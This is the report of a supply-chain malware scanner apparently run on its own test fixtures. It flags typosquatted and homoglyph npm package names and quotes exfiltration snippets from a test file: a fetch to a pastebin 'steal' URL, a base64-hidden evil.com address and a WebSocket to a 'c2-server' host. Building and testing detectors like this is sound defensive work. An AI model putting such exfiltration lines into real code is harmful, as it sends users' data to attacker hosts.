  SHAI-HULUD + PARANOID SECURITY REPORT
==============================================

⚠️  MEDIUM RISK (PARANOID): Potential typosquatting/homoglyph attacks detected:
   - Warning: Potential Unicode/homoglyph characters in package: reаct
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json
   - Warning: Potential typosquatting of 'lodash': lodsh (missing character)
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json
   NOTE: These packages may be impersonating legitimate packages.
   Verify package names carefully and check if they should be legitimate packages.

⚠️  MEDIUM RISK (PARANOID): Network exfiltration patterns detected:
   - Warning: Hardcoded IP addresses found: 10.0.1.50
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: Suspicious domain found: pastebin.com: fetch("https://pastebin.com/steal", {
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: Base64 decoding at line: const hiddenUrl = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: WebSocket connection to external endpoint: wss://c2-server.evil.com/data
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: Suspicious base64 encoding near network operation
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   NOTE: These patterns may indicate data exfiltration or communication with C2 servers.
   Review network connections and data flows carefully.

==============================================
🔍 SUMMARY:
   High Risk Issues: 0
   Medium Risk Issues: 7
   Total Critical Issues: 7

⚠️  IMPORTANT:
   - High risk issues likely indicate actual compromise
   - Medium risk issues require manual investigation
   - Low risk issues are likely false positives from legitimate code
   - Issues marked (PARANOID) are general security checks, not Shai-Hulud specific
   - Consider running additional security scans
   - Review your npm audit logs and package history
